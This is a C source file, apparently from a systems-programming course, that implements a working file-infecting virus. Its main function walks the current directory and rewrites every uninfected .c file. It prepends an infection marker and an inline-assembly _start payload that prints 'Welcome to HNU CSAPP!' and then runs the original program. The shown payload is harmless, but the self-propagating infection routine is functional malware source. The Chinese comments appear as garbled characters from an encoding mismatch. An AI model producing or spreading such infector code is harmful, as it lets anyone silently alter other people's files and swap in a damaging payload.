// VIRUS_INSERTED
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define VIRUS_MARKER "// VIRUS_INSERTED"

// ����ļ��Ƿ��ѱ���Ⱦ
int is_infected(const char *filename) {
	FILE *fp = fopen(filename, "r");
	if (!fp)
		return 0;
	char line[256];
	int infected = 0;
	while (fgets(line, sizeof(line), fp)) {
		if (strstr(line, VIRUS_MARKER)) {
			infected = 1;
			break;
		}
	}
	fclose(fp);
	return infected;
}

// ��ȾĿ���ļ�
void infect_file(const char *filename) {
	// ��ȡԭ�ļ�����
	FILE *src = fopen(__FILE__, "r"); // �����������
	FILE *dst = fopen(filename, "r");
	if (!src || !dst) {
		perror("Failed to open file");
		if (src)
			fclose(src);
		if (dst)
			fclose(dst);
		return;
	}

	// ��ȡĿ���ļ�ȫ������
	fseek(dst, 0, SEEK_END);
	long size = ftell(dst);
	rewind(dst);
	char *content = (char *)malloc(size + 1);
	fread(content, 1, size, dst);
	content[size] = '\0';
	fclose(dst);

	// ������д��ģʽ���ļ������벡������
	dst = fopen(filename, "w");
	if (!dst) {
		perror("Failed to write file");
		free(content);
		fclose(src);
		return;
	}

	// ���벡����Ǻͱ�����ʾ
	fprintf(dst, "%s\n", VIRUS_MARKER);
	fprintf(dst, "// COMPILE WITH: gcc -nostartfiles -o %%s %%s -Wl,-e,_start\n\n");

	// ��������루Ubuntu 20.04 ���䣩
	fprintf(dst, "__attribute__((used)) static void _payload() {\n");
	fprintf(dst, "  __asm__(\n");
	fprintf(dst, "    \".section .text\\n\"\n");
	fprintf(dst, "    \".global _start\\n\"\n");
	fprintf(dst, "    \"_start:\\n\"\n");
	fprintf(dst, "    \"    and $~15, %%rsp\\n\"     // ջ����\n");
	fprintf(dst, "    \"    sub $16, %%rsp\\n\"\n");
	fprintf(dst, "    \"    mov %%rsp, %%rbx\\n\"     // ����ԭʼջָ�뵽rbx\n");
	fprintf(dst, "    \"    call print_welcome\\n\"\n");
	fprintf(dst, "    \"    mov %%rbx, %%rsp\\n\"     // �ָ�ջָ��\n");
	fprintf(dst, "    \"    mov %%rsp, %%rsi\\n\"    // argv\n");
	fprintf(dst, "    \"    lea 8(%%rsp), %%rsi\\n\"  // argc = *argv\n");
	fprintf(dst, "    \"    lea 8(%%rsi,%%rdi,8), %%rdx\\n\"  // envp\n");
	fprintf(dst, "    \"    add $16, %%rsp\\n\"      // �ָ�ջ\n");
	fprintf(dst, "    \"    call main\\n\"\n");
	fprintf(dst, "    \"    mov %%rax, %%rdi\\n\"      // ��main����ֵ��Ϊexit����\n");
	fprintf(dst, "    \"    mov $60, %%rax\\n\"     // syscall: exit\n");
	fprintf(dst, "    \"    syscall\\n\"      // �˳�����\n");
	fprintf(dst, "    \"print_welcome:\\n\"\n");
	fprintf(dst, "    \"    mov $1, %%rax\\n\"       // syscall: write\n");
	fprintf(dst, "    \"    mov $1, %%rdi\\n\"       // fd = stdout\n");
	fprintf(dst, "    \"    lea msg(%%rip), %%rsi\\n\"\n");
	fprintf(dst, "    \"    mov $22, %%rdx\\n\"      // ��Ϣ����\n");
	fprintf(dst, "    \"    syscall\\n\"\n");
	fprintf(dst, "    \"    ret\\n\"\n");
	fprintf(dst, "    \"msg:\\n\"\n");
	fprintf(dst, "    \"    .ascii \\\"Welcome to HNU CSAPP!\\\\n\\\"\\n\"\n");
	fprintf(dst, "  );\n");
	fprintf(dst, "}\n\n");

	// д��ԭ�ļ�����
	fwrite(content, 1, size, dst);

	// ������Դ
	free(content);
	fclose(src);
	fclose(dst);
}

// ����������Ⱦ��ǰĿ¼������.c�ļ�
int main() {
	DIR *dir = opendir(".");
	if (!dir) {
		perror("Failed to open directory");
		return 1;
	}

	struct dirent *ent;
	while ((ent = readdir(dir)) != NULL) {
		if (strstr(ent->d_name, ".c") && !strstr(ent->d_name, "virus.c")) {
			if (!is_infected(ent->d_name)) {
				printf("Infecting: %s\n", ent->d_name);
				infect_file(ent->d_name);
			}
		}
	}

	closedir(dir);
	return 0;
}